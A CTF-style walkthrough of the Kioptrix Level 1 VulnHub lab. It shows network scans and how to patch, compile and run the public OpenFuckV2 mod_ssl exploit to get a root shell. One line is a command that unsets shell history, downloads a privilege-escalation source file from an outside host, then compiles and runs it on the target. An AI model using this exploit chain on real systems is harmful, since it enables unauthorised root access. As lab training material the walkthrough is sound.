---
layout: single
date: 2019-06-20
title: "Kioptrix Level: 1"
header:
    overlay_image: /assets/images/kioptrix_level1.png
    caption: "[__VulnHub__](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)"
related: true
comments: true
---





Hello Everyone!, and welcome to my VulnHub VM Write-Ups!

First thing first, we are going to set up our VM. You can download from [here](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/).

## Abot the VM:

```console
Kioptrix VM Image Challenges:

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access 
via any means possible (except actually hacking the VM server or player). The purpose of 
these games are to learn the basic tools and techniques in vulnerability assessment and 
exploitation. There are more ways then one to successfully complete the challenges.
```

## Let's begin the fun!! stuff.

```console
root@kali:~# netdiscover

Currently scanning: Finished!   |   Screen View: Unique Hosts                 

2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 84                
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.2    [......!!!....]      1      42  Honda Electronics Co.,Ltd 
 192.168.1.23    [......!!!....]      1      42  PCS Systemtechnik GmbH
 ```

 Our target IP is `192.168.1.23`.

 Run the `nmap` scan to know the open Ports and Services.
 
 ```console
root@kali:~# nmap -sS -A -n 192.168.1.23
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-20 21:20 IST
Nmap scan report for 192.168.1.23
Host is up (0.00068s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1          32768/tcp  status
|_  100024  1          32768/udp  status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2019-06-20T19:41:22+00:00; +3h50m34s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:FD:2B:42 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: mean: 3h50m33s, deviation: 0s, median: 3h50m33s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.68 ms 192.168.1.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 271.72 seconds
```

Taking a look at the Nmap scan we see that we have TCP/22 Open (SSH) and TCP/80 Open (HTTP).

Run the 'nikto' scan.

```console
root@kali:~# nikto -h 192.168.1.23
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.23
+ Target Hostname:    192.168.1.23
+ Target Port:        80
+ Start Time:         2019-06-20 21:33:43 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 08:42:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ 8345 requests: 0 error(s) and 21 item(s) reported on remote host
+ End Time:           2019-06-20 21:34:12 (GMT5.5) (29 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`nikto` finds out that the version of mod_ssl is vulnerable to a Remote Buffer Overflow which may allow a Remote Shell.

After a little research work...an Exploit is found in [exploit-db.com](https://www.exploit-db.com/exploits/764) named `OpenFuckV2.c`.
Download the exploit and it will be saved as `764.c`.

Now we have to edit the exploit a little bit.

## Add the following headers.
```console
#include <openssl/rc4.h>
#include <openssl/md4.h>
```

## Update the URL in the Command.
```console
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
```
## To
```console
http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
```

We can also do it from our attacking machine after downloading it locally.

## Installing the libssl-dev lib
With the newer version of `libssl-dev` it is not compatible.
```console
root@kali:~# apt-get install libssl1.0-dev
```

## Update declaration of variables.
On line 961: Change
```console
unsigned char *p, *end;
```
Add `const` and Update to
```console
const unsigned char *p, *end;
```
Save the file and compile it
```console
root@kali:~# gcc -o exploit 764.c -lcrypto
```

Now run the exploit
```console
root@kali:~./exploit 0x6b 192.168.1.23 443 -c 40

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
--17:06:05--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:80... connected!
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
--17:06:06--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   1.25 MB/s

17:06:09 (957.28 KB/s) - `ptrace-kmod.c' saved [3921/3921]

/usr/bin/ld: cannot open output file p: Permission denied
collect2: ld returned 1 exit status
```

And We got the remote shell
```console
whoami
root
```
This was easy. Only some Research work needed.

## Thank You! for learning with me. Keep Moving!!!